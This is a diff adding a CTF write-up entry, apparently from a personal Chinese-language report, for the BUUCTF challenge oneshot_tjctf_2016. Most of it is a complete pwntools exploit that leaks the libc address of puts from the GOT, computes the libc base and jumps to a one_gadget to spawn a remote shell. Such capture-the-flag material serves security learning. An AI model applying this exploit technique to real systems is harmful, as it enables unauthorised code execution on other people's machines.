@@ -1205,8 +1205,62 @@ sl(payload)
 shell()
 ```
 
+## 19.BUUCTF-oneshot_tjctf_2016
+任意地址泄漏 之后会将v4的值当作一个地址返回
+
+<img width="387" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/15176deb-32dd-47a0-a543-7a998c61d1c7">
+
+1.泄漏libc 2.将v4覆盖为one_gadget
+
+### exp_oneshot_tjctf_2016.py
+```python
+from pwn import *
+# p = process("./oneshot_tjctf_2016")
+p = remote("node4.buuoj.cn",27026)
+context.log_level = 'debug'
+# context.arch = 'amd64'
+# context(os="linux", arch="amd64",log_level = "debug")
+# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+libc = ELF("/mnt/hgfs/ubuntu/BUUCTF/source/ubuntu16/libc-2.23-64.so")
 
 
+r = lambda : p.recv()
+rx = lambda x: p.recv(x)
+ru = lambda x: p.recvuntil(x)
+rud = lambda x: p.recvuntil(x, drop=True)
+s = lambda x: p.send(x)
+sl = lambda x: p.sendline(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+shell = lambda : p.interactive()
+
+puts_got = 6294232
+
+# 1.leak libc
+ru("Read location?\n")
+sl(str(puts_got))
+
+ru("Value: ")
+
+libc_puts = int(rx(18), 16)
+success("libc_puts ==> {}".format(hex(libc_puts)))
+
+libc_base = libc_puts - libc.symbols['puts']
+success("libc_base ==> {}".format(hex(libc_base)))
+
+# ones = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
+ones = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
+
+one_gadget = libc_base + ones[0]
+
+# 2.one_gadget
+ru("Jump location?\n")
+
+sl(str(one_gadget))
+
+
+shell()
+```
 
 
 
